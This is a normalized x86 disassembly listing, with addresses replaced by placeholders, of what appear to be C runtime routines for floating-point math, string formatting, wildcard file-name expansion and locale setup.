push [ ebp + 0x10 ]
push ebx
call sub_41540e
add esp 0x20
cmp eax edi
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test cl cl
je r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call sub_4155e6
add esp 0x18
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
mov [ esi - 0x2 ] al
sub_415785
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov bl [ ebp + 0xc ]
movzx eax bl
add eax 0x4
cmp edx eax
jae r-xdata
test bl bl
je r-xdata
push 0xc
mov [ ecx ] 0x0
pop eax
mov eax r--data
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x44 ] eax
xor ebx ebx
cmp [ ebp + 0x18 ] bl
mov [ ebp - 0x40 ] eax
mov eax r--data
mov [ ebp - 0x3c ] eax
setne bl
mov [ ebp - 0x38 ] eax
dec ebx
mov eax r--data
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x2c ] eax
and ebx 0x2
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi r--data
mov [ ebp - 0x14 ] r--data
push edi
lea edi [ eax * 4 - 0x4 ]
mov [ ebp - 0x34 ] esi
lea eax [ edi + ebx ]
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] r--data
mov esi [ ebp + eax * 4 - 0x44 ]
lea eax [ esi + 0x1 ]
mov [ ebp - 0x48 ] eax
mov [ ecx ] 0x2d
inc ecx
dec edx
mov [ ecx ] 0x0
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi [ ebp - 0x48 ]
cmp esi edx
sbb eax eax
inc edi
add eax edi
add eax ebx
push [ ebp + eax * 4 - 0x44 ]
push edx
push ecx
call sub_411dd3
add esp 0xc
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
sub_41587d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
mov ecx esi
push edi
lea edi [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
lea eax [ ecx + 0x1 ]
push eax
lea eax [ esi + edx ]
push esi
push eax
call sub_40dcd0
add esp 0xc
pop edi
pop esi
sub_4158b1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop ebx
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov esi [ ebp + 0x1c ]
cmp esi 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp esi 0x45
je r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x10
or eax 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_414fe6
mov [ ebp - 0x8 ] eax
pop ecx
test eax eax
je r-xdata
cmp esi 0x46
je r-xdata
push 0x2
push 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_415052
pop ecx
movzx eax al
push eax
push [ ebp - 0x8 ]
call sub_415785
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi 0x47
jne r-xdata
sub esi 0x65
je r-xdata
pop eax
cmp esi 0x61
jg r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x8
or eax 0x0
jne r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_415373
sub esi 0x1
je r-xdata
push [ ebp + 0x2c ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_415070
jmp r-xdata
sub esi 0x41
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_415559
add esp 0x1c
jmp r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4156bd
jmp r-xdata
add esp 0x24
sub esi 0x4
jmp r-xdata
push [ ebp + 0x2c ]
je r-xdata
sub_4159fb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub [ edx + 0x8 ] 0x1
jns r-xdata
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
pop ebp
retn
push edx
push [ ebp + 0x8 ]
call sub_4146da
pop ecx
pop ecx
pop ebp
retn
sub_415a5c
mov [ ebp - 0x90 ] 0xfe
fabs
fxch st1
fabs
fxch st1
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_415a7c
fabs
fld st0
fld st0
fld1
fsubrp st1
fxch st1
fld1
faddp st1
fmulp st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
pop eax
jmp sub_41a8b3
xor ch ch
fsqrt
retn
sub_415ab5
fstp st0
or cl cl
je r-xdata
fstp st0
fldz
or ch ch
je r-xdata
fstp st0
fldpi
or ch ch
je r-xdata
retn
fchs
retn
fchs
sub_415af0
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
fwait
push eax
push ecx
push edx
call sub_41107d
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fxch st1
fst [ ebp - 0x86 ]
fxch st1
fst [ ebp - 0x7e ]
jmp r-xdata
call sub_41a767
or [ ebp - 0x2c8 ] 0x3
call sub_415bbf
pop ebx
leave
retn
sub_415b34
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
push eax
push ecx
push edx
call sub_41107d
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fst [ ebp - 0x86 ]
jmp r-xdata
call sub_41a700
or [ ebp - 0x2c8 ] 0x1
and [ ebp - 0x2c8 ] 0xfd
call sub_415bbf
pop ebx
leave
retn
sub_415b77
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415d39
add esp 0x8
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_415d39
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
or [ ebp - 0x2c8 ] 0x2
call sub_41a767
call sub_415bb8
pop ebx
leave
retn
sub_415bbf
cmp [ rw-data ] 0x0
jne r-xdata
fldcw [ ebp - 0xa4 ]
fwait
retn
fst [ ebp - 0x2d0 ]
mov al [ ebp - 0x90 ]
or al al
je r-xdata
mov ax [ ebp - 0xa4 ]
and ax 0x20
jne r-xdata
cmp al 0xff
je r-xdata
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
cmp ax 0x7ff0
je r-xdata
cmp al 0xfe
je r-xdata
mov [ ebp - 0x8e ] 0x8
jmp r-xdata
mov [ ebp - 0x8e ] 0x3
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jbe r-xdata
jmp r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
or ax ax
je r-xdata
or al al
je r-xdata
push esi
push edi
mov ebx [ ebp - 0x94 ]
inc ebx
mov [ ebp - 0x8a ] ebx
test [ ebp - 0x2c8 ] 0x1
jne r-xdata
fmul [ r--data ]
mov [ ebp - 0x8e ] 0x4
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jae r-xdata
cmp ax 0x7ff0
je r-xdata
movsx eax al
mov [ ebp - 0x8e ] eax
jmp r-xdata
fstp [ ebp - 0x76 ]
lea eax [ ebp - 0x8e ]
lea ebx [ ebp - 0xa4 ]
push ebx
push eax
mov ebx [ ebp - 0x94 ]
mov al [ ebx + 0xe ]
movsx eax al
push eax
call sub_41a8f4
add esp 0xc
pop edi
pop esi
fld [ ebp - 0x76 ]
jmp r-xdata
cld
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x86 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx + 0xc ] 0x1
je r-xdata
fmul [ r--data ]
jmp r-xdata
jmp r-xdata
lea esi [ ebp + 0x10 ]
lea edi [ ebp - 0x7e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_415d06
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415d39
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
and [ ebp - 0x2c8 ] 0xfd
call sub_41a700
call sub_415bb8
pop ebx
leave
retn
sub_415d39
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ax [ ebp + 0xe ]
mov bx ax
and ax 0x7ff0
cmp ax 0x7ff0
jne r-xdata
fld [ ebp + 0x8 ]
or bx 0x7fff
mov [ ebp - 0x2 ] bx
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
shld eax ebx 0xb
mov [ ebp - 0x6 ] eax
mov [ ebp - 0xa ] ebx
fld [ ebp - 0xa ]
jmp r-xdata
pop ebx
leave
retn
sub_415d80
cmp [ rw-data ] 0x0
je sub_415e0f
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_415e0f
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41aa28
sub_415dc0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_41ac48
call sub_415e18
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41aa10
sub_415e18
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fcos
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x12
lea ecx [ r--data ]
call sub_41ad67
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fcos
jmp r-xdata
mov edx 0x12
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_41ad67
pop edx
retn
sub_415eb0
cmp [ rw-data ] 0x0
je sub_415f3f
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_415f3f
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41adc8
sub_415ef0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_41ac48
call sub_415f48
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41adb0
sub_415f48
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fsin
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x1e
lea ecx [ r--data ]
call sub_41ad67
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fsin
jmp r-xdata
mov edx 0x1e
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_41ad67
pop edx
retn
sub_415fd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi sub_4110aa
push [ rw-data ]
call [ DecodePointer@IAT ]
mov edi eax
jmp r-xdata
sub eax 0x1b
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x1a
jg r-xdata
mov [ ebp - 0x24 ] 0x2
sub eax 0x1
je r-xdata
fld1
cmp eax 0xe
jg r-xdata
fld [ ebp - 0xc ]
fstp [ esi ]
call sub_4135e3
mov [ eax ] 0x22
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x15
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub eax 0xf
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x1
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x24 ] 0x3
mov [ ebp - 0x20 ] r--data
jmp r-xdata
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_4135e3
mov [ eax ] 0x21
jmp r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x4
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x3
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3ab
je r-xdata
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
fstp [ eax ]
jmp r-xdata
mov [ ebp - 0x20 ] r--data
sub_41620d
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_41abec
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_41abd5
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ r--data ]
call sub_41ad67
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_41ad67
pop edx
retn
sub_4162aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_4162c2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x4 ] ecx
mov edx eax
add eax 0x3
sar edx 0x2
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0xc ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x3f2a
push eax
push [ esi ]
mov [ ebp - 0x2 ] cl
call sub_41b4c0
pop ecx
pop ecx
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push [ ebp - 0x4 ]
push edx
call sub_4113a1
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edx edi
mov ebx ecx
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push [ esi ]
call sub_4164e8
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push [ esi ]
call sub_416452
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0xc ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov edx eax
mov [ ebp - 0xc ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x4 ]
inc ebx
mov eax [ ebp - 0x8 ]
add ebx ecx
add edx 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x20 ]
call sub_41666c
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
xor edi edi
mov [ eax ] esi
mov eax esi
sub eax edi
mov [ ebp - 0x14 ] eax
push 0x0
call sub_411e2d
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x1c ]
mov ebx [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x8 ]
lea eax [ ecx + 0x1 ]
push eax
push [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
sub eax edx
add eax [ ebp - 0x4 ]
push eax
push edx
call sub_41b4ab
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax + edi ] edx
add edi 0x4
add edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
sub_416452
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
or eax 0xffffffff
push edi
mov edi [ ebp + 0x10 ]
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push ebx
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x1
push ebx
call sub_411ef8
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_41b4ab
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_41b4ab
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_416691
push 0x0
mov esi eax
call sub_411e2d
pop ecx
mov eax esi
pop esi
pop ebx
sub_4164e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ ebp - 0x148 ] esi
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov al [ ecx ]
cmp al 0x2f
je r-xdata
mov dl [ ecx ]
cmp dl 0x3a
jne r-xdata
cmp al 0x5c
je r-xdata
xor edi edi
cmp dl 0x2f
je r-xdata
lea eax [ ebx + 0x1 ]
cmp ecx eax
je r-xdata
cmp al 0x3a
je r-xdata
xor eax eax
inc eax
cmp dl 0x5c
je r-xdata
push esi
xor edi edi
push edi
push edi
push ebx
call sub_416452
add esp 0x10
jmp r-xdata
push ecx
push ebx
call sub_41b500
pop ecx
pop ecx
mov ecx eax
mov ecx [ eax + 0x4 ]
sub ecx [ eax ]
sar ecx 0x2
mov [ ebp - 0x150 ] ecx
push eax
push edi
push edi
push ebx
call sub_416452
add esp 0x10
cmp dl 0x3a
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
push eax
push [ ebp - 0x14c ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
call sub_416452
add esp 0x10
test eax eax
jne r-xdata
mov cl [ ebp - 0x117 ]
test cl cl
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x144 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
mov eax [ ebp - 0x148 ]
jne r-xdata
cmp cl 0x2e
jne r-xdata
movzx eax al
sub ecx ebx
inc ecx
neg eax
push 0x140
sbb eax eax
and eax ecx
mov [ ebp - 0x14c ] eax
lea eax [ ebp - 0x144 ]
push edi
push eax
call sub_40be70
add esp 0xc
lea eax [ ebp - 0x144 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExA@IAT ]
mov esi eax
mov eax [ ebp - 0x148 ]
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x118 ] 0x2e
jne r-xdata
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x150 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x116 ] 0x0
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_4162aa
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_41b060
add esp 0x10
jmp r-xdata
sub_41666c
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_411e2d
pop ecx
add esi 0x4
push [ edi ]
call sub_411e2d
pop ecx
pop edi
pop esi
retn
sub_416691
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_4166c6
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_411e2d
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_4166c6
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_411ef8
push 0x0
mov [ esi ] eax
call sub_411e2d
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_417aae
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_411e2d
pop ecx
mov eax esi
pop ebx
sub_416758
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_4167c3
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41678f
call sub_40b336
retn 0xc
sub_41679b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_416758
mov esp ebp
pop ebp
retn
sub_4167c3
mov edi edi
push esi
mov esi ecx
push 0xc
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x21c ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0xc
push eax
push 0xc
push rw-data
call sub_416ee3
mov eax [ esi ]
mov ecx 0x101
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x18
push eax
push ecx
push rw-data
call sub_416ee3
mov eax [ esi ]
mov ecx 0x100
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x119
push eax
push ecx
push rw-data
call sub_416ee3
mov eax [ rw-data ]
add esp 0x30
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
